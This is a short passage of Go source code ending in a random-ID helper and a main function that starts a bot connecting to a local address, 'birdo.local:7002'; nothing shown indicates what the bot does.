	if _, err := rand.Read(bytes); err != nil {
		// fallback to less random
		return fmt.Sprintf("%x", time.Now().UnixNano())
	}
	return hex.EncodeToString(bytes)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	bot := NewBot(generateRandomID(16), "birdo.local:7002")
	bot.Start()
}
